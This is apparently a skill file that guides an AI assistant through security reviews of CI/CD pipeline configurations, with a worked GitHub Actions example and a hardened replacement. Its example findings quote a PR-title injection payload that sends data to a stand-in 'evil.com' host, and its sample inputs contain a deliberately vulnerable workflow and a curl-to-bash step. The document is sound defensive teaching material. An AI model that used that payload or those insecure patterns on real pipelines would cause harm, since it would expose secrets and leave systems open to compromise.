---
name: cicd-security-hardener
description: Review CI/CD pipeline configs for secret leaks, injection risks, and excessive permissions
personas: [Developer, Cloud/Infra]
---

# CI/CD Security Hardener

Analyze CI/CD pipeline configuration files for security vulnerabilities, misconfigurations, and best-practice violations. This skill targets GitHub Actions, GitLab CI, Azure Pipelines, CircleCI, and Jenkins declarative pipelines. Use it during code review, pipeline creation, or periodic security audits to catch issues before they reach production.

## Input

A CI/CD configuration file provided as YAML (or Jenkinsfile). The user may paste the full file or a relevant excerpt. They may optionally specify the CI platform if it is not obvious from the syntax.

Example input:

```yaml
# .github/workflows/deploy.yml
name: Deploy
on: pull_request_target

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - uses: actions/checkout@v2
      - run: echo "${{ github.event.pull_request.title }}" > title.txt
      - run: |
          curl -H "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}" \
               https://deploy.example.com/trigger
```

## Output

Return a structured security report containing:

1. **Summary** -- one-paragraph overall assessment with a risk rating (Critical / High / Medium / Low / Informational).
2. **Findings table** -- each finding includes:
   - Severity (Critical / High / Medium / Low / Info)
   - Vulnerability type (e.g., Script Injection, Secret Exposure, Excessive Permissions)
   - Location (file path, job name, step number or line reference)
   - Description of the issue
   - Remediation with a corrected config snippet
3. **Hardened config** -- the full corrected configuration file incorporating all remediations.
4. **Additional recommendations** -- broader suggestions (pinning actions to SHA, adding CODEOWNERS, enabling branch protection, etc.).

## Instructions

Follow these rules when analyzing a CI/CD configuration:

### 1. Identify the Platform

Determine the CI/CD platform from file structure, syntax, or user context. Apply platform-specific security guidance:

- **GitHub Actions**: Check `on` triggers, `permissions`, expression injection via `${{ }}`, action pinning, `GITHUB_TOKEN` scope, artifact handling, `pull_request_target` risks.
- **GitLab CI**: Check `rules`, protected variables, shared runners, `allow_failure`, artifact exposure, `CI_JOB_TOKEN` scope, include/extends from external sources.
- **Azure Pipelines**: Check service connections, variable groups, template references, checkout of forks, pipeline resource authorization.
- **CircleCI**: Check contexts, orb versions, SSH keys, environment variable exposure.
- **Jenkins**: Check script approval, credentials binding, shared libraries, agent labels.

### 2. Check for Script Injection

Script injection is the most critical CI/CD vulnerability. Flag any instance where **untrusted input** flows into a `run`, `script`, or shell block without sanitization. Untrusted inputs include:

- Pull request titles, body text, branch names, commit messages
- Issue titles, comments, labels
- Any value from `github.event.*` that an external contributor controls
- Webhook payloads in general

For GitHub Actions specifically, flag any `${{ }}` expression inside a `run:` block that references attacker-controllable event data. The fix is to pass the value through an environment variable instead:

```yaml
# VULNERABLE
- run: echo "${{ github.event.pull_request.title }}"

# FIXED
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

### 3. Check Permissions and Privilege

- Flag `permissions: write-all` or absence of `permissions` (which defaults to read-write on many configurations).
- Require explicit, minimal `permissions` at the workflow and job level.
- Flag workflows that request `contents: write`, `packages: write`, `id-token: write`, or other sensitive permissions unless clearly justified by the job's purpose.
- Flag use of personal access tokens (PATs) where `GITHUB_TOKEN` would suffice.
- Flag service accounts or tokens with admin-level access.

### 4. Check Secret Handling

- Flag secrets printed to stdout, written to files, or passed as command-line arguments (visible in process listings).
- Flag secrets passed to third-party or unvetted actions.
- Flag secrets used in `pull_request_target` or `workflow_run` workflows triggered by external forks.
- Flag hardcoded tokens, passwords, or API keys anywhere in the config.
- Recommend using OIDC / workload identity federation over long-lived secrets where the cloud provider supports it.

### 5. Check Action / Image Pinning

- Flag actions referenced by mutable tag (e.g., `actions/checkout@v2`) instead of full SHA (e.g., `actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29`).
- Flag Docker images referenced by `latest` or mutable tags instead of digest.
- Flag use of third-party actions from unknown or unverified publishers. Recommend auditing the action source or vendoring it.

### 6. Check Trigger Safety

- Flag `pull_request_target` with `actions/checkout` of the PR head ref, as this executes untrusted code with write permissions.
- Flag `workflow_run` triggered by workflows from forks.
- Flag `push` triggers on wildcard branches without branch protection.
- Flag `schedule` triggers in public repos (cron jobs that run on the default branch).

### 7. Check for Information Disclosure

- Flag steps that upload artifacts containing secrets, credentials, or sensitive environment dumps.
- Flag verbose logging (`set -x`, `--verbose`, debug modes) that may leak secrets.
- Flag caching steps that might persist sensitive data across workflow runs.

### 8. Check Supply Chain Risks

- Flag fetching scripts from the internet and piping to shell (`curl ... | bash`).
- Flag installation of packages without version pinning or integrity verification.
- Flag missing dependency lock files or failure to use `--frozen-lockfile` / `--ci` equivalents.

### 9. Formatting Rules

- Present findings sorted by severity (Critical first).
- Always provide a corrected snippet for each finding -- do not just describe the fix.
- In the hardened config, add inline comments explaining each security-relevant change.
- If the config has no findings, say so explicitly and still offer hardening recommendations.

## Examples

### Example 1: GitHub Actions Workflow with Multiple Issues

**Input:**

```yaml
name: Build and Deploy
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Log PR info
        run: |
          echo "PR Title: ${{ github.event.pull_request.title }}"
          echo "PR Author: ${{ github.event.pull_request.user.login }}"

      - name: Install deps
        run: curl -sL https://raw.githubusercontent.com/some-org/setup/main/install.sh | bash

      - name: Deploy
        run: |
          DEPLOY_KEY="${{ secrets.PROD_DEPLOY_KEY }}"
          ./deploy.sh --key="$DEPLOY_KEY" --env=production
```

**Output:**

### Summary

This GitHub Actions workflow has **Critical** overall risk. It uses the dangerous `pull_request_target` trigger combined with checkout of the PR head, creating a code execution vulnerability. It also contains script injection vectors, excessive permissions, unpinned actions, an untrusted remote script, and secrets exposed via command-line arguments. Immediate remediation is required before this workflow is used in any repository.

### Findings

| # | Severity | Type | Location | Description | Remediation |
|---|----------|------|----------|-------------|-------------|
| 1 | Critical | Dangerous Trigger + Checkout | `on: pull_request_target`, job `build`, step 1 | `pull_request_target` runs in the context of the base branch with write permissions and access to secrets. Checking out the PR head SHA means arbitrary code from a fork will execute with those elevated privileges. An attacker can modify any file in the checkout (including build scripts, Makefiles, or package.json scripts) to exfiltrate secrets or push malicious code. | Split into two workflows: a `pull_request` workflow for building/testing untrusted code (no secrets, read-only), and a separate `workflow_run` workflow for deployment that only triggers after approval. Alternatively, remove the `ref:` override so only the trusted base branch is checked out. |
| 2 | High | Script Injection | Job `build`, step 2 (`Log PR info`) | `github.event.pull_request.title` is directly interpolated into a `run` block. An attacker can set the PR title to `"; curl http://evil.com/steal?t=$(cat $GITHUB_TOKEN); echo "` to execute arbitrary commands. | Pass the value through an environment variable. |
| 3 | High | Excessive Permissions | Job `build`, `permissions: write-all` | Grants every possible permission (contents write, packages write, deployments write, etc.) to the job. If any step is compromised, the attacker gains full repository access. | Set granular, minimal permissions. This workflow likely only needs `contents: read`. |
| 4 | High | Remote Script Execution | Job `build`, step 3 (`Install deps`) | Fetches a script from a remote URL and pipes it directly to bash. The remote content could be changed at any time (supply chain attack). There is no integrity check. | Vendor the script into the repository, or download it with checksum verification. Pin to a specific commit SHA. |
| 5 | Medium | Secret in CLI Argument | Job `build`, step 4 (`Deploy`) | The deploy key is passed as a command-line argument (`--key="$DEPLOY_KEY"`). Command-line arguments are visible in `/proc` on Linux and may appear in process listing logs. | Pass the secret via environment variable or stdin. |
| 6 | Medium | Unpinned Action | Job `build`, step 1 | `actions/checkout@v3` uses a mutable tag. A compromised tag could point to malicious code. | Pin to a full commit SHA. |

**Remediation for Finding 2:**

```yaml
      - name: Log PR info
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
        run: |
          echo "PR Title: $PR_TITLE"
          echo "PR Author: $PR_AUTHOR"
```

**Remediation for Finding 5:**

```yaml
      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}
        run: |
          ./deploy.sh --env=production
          # deploy.sh should read DEPLOY_KEY from the environment variable
```

### Hardened Config

```yaml
name: Build (Untrusted PR Code)
on:
  pull_request: # Use pull_request, NOT pull_request_target
    branches: [main]

permissions:
  contents: read # Minimal permissions at workflow level

jobs:
  build:
    runs-on: ubuntu-latest
    # No additional permissions needed; inherits workflow-level read-only
    steps:
      # Pin action to full SHA for supply chain safety
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1
        # No ref override -- checks out the merge commit (safe for pull_request trigger)

      - name: Log PR info
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
        run: |
          echo "PR Title: $PR_TITLE"
          echo "PR Author: $PR_AUTHOR"

      - name: Install deps
        # Vendor install script or verify checksum; do NOT curl | bash
        run: |
          bash ./scripts/vendored-install.sh

      # Deployment should be a SEPARATE workflow triggered after merge / approval
      # Do NOT deploy from a PR workflow
```

```yaml
# Separate deployment workflow -- runs only on push to main after merge
name: Deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write # If using OIDC for cloud auth

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production # Requires environment protection rules / approvals
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1

      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}
        run: |
          # deploy.sh reads DEPLOY_KEY from environment (not CLI arg)
          ./deploy.sh --env=production
```

### Additional Recommendations

- Enable branch protection on `main` requiring PR reviews and status checks.
- Add a `CODEOWNERS` file to require security team review for workflow changes (`.github/workflows/**`).
- Consider replacing the long-lived `PROD_DEPLOY_KEY` with OIDC-based workload identity federation (supported by AWS, GCP, Azure).
- Enable GitHub's "Require approval for all outside collaborators" setting for Actions on public repositories.
- Add Dependabot or Renovate for automated action version updates with SHA pinning.

## Edge Cases & Guardrails

- **Partial configs**: If the user provides only a fragment, analyze what is visible and note that a complete review requires the full file. Do not invent assumptions about missing sections.
- **Non-YAML formats**: For Jenkinsfiles (Groovy) or other non-YAML pipelines, apply the same security principles but adapt the syntax in remediation snippets.
- **False positives**: Some expression injections are safe if the value is from a trusted source (e.g., `github.repository` is not attacker-controlled). Acknowledge this but still recommend defensive patterns.
- **Do not run or validate YAML**: Analyze statically. Do not attempt to execute or parse the YAML programmatically. Focus on pattern matching and semantic analysis.
- **Do not suggest disabling security features**: Never recommend turning off branch protection, required reviews, or secret scanning to "simplify" a pipeline.
- **Multi-file pipelines**: If the config references reusable workflows, templates, or includes, note that those external references should also be reviewed and ask the user to provide them if available.
- **Secrets in output**: If the user accidentally pastes real secrets in the config, flag this immediately and recommend rotating the exposed credentials. Do not repeat the secret value in the output; redact it.
